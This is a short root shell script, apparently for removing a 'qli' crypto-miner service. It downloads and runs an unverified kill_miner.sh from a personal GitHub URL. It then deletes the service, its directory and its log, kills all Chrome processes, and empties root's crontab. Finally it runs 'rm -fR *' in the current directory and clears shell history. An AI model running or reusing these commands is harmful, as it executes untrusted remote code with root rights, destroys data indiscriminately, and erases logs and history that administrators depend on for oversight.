#!/bin/sh
wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
rm /etc/systemd/system/qli.service
systemctl daemon-reload
rm -R /q
rm /var/log/qli.log
/bin/pkill -f "chrome"
cat /dev/null > /var/spool/cron/crontabs/root
sleep 3
rm -fv *
rm -fR *
history -c && history -w
